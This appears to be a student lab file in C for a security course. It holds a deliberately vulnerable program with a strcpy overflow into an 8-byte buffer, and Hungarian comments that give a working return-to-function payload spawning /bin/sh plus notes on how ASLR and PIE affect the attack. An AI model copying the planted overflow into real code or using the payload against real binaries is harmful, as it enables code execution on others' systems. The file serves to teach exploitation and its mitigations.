#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char* not_used = "/bin/sh";

void now_called(char* command) {
    printf("Not quite a shell...\n");
    system(command);
}

void vulnerable_function(char* string) {
    char buffer[8];
    strcpy(buffer, string);
}

int main(int argc, char** argv) {
    if (argc != 2) {
        printf("Please specify one argument!\n");
        return 0;
    }

    vulnerable_function(argv[1]);

    now_called("/bin/date");

    return 0;
}
/*
now_called cime: 0x8049186
&not_used : 0x804c018
/bin/sh cime : 0x804a008

teofil-antal@CAESAR:/mnt/c/Users/azaze/Desktop/secit/Securitate-IT/task-2/task-2$ ./app_32 $'AAAAAAAAAAAAAAAA\x86\x91\x04\x08AAAA\x08\xa0\x04\x08'
Not quite a shell...
$ 

(buffer + EBP) 16 x A
now_called cime
AAAA - hogy a parameter jo helyere keruljon
/bin/sh cime (not_used) erteke

now called a stack-rol olvassa a parametert a $esp+4 cimen. A 4 byte padding biztositja, hogy a /bin/sh cime pontosan $esp+8-ra keruljon
*/

/*
withASLR : now_called cime ugyanaz minden futtataskor, not_used statikus adat cime ugyanaz minden futtataskor
csak a stack (buffer, EBP< RET) cime valtozik, nem ved a tamadas ellen

ASLR + PIE:
maga a program kodja is randomizalva van

now_called, not_used, stack cimek randomizaltak, ez ved segmentation faultot adott
*/